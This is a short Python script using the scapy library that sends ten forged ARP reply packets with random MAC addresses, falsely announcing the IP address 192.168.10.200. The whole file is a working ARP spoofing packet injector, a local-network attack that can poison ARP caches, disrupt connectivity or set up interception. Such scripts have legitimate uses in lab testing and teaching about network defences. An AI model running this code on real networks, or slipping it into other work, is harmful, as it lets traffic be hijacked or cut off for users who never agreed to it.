#!/usr/local/bin/python

from scapy.all import *

for i in range(10):
    srcmac = RandMAC()
    dstmac = RandMAC() # shuld ff:ff:ff:ff:ff:ff?
    sendp(Ether(src=srcmac,dst=dstmac)/ARP(op=2, psrc="192.168.10.200", hwsrc=srcmac, hwdst=dstmac)/Padding(load="X"*18))
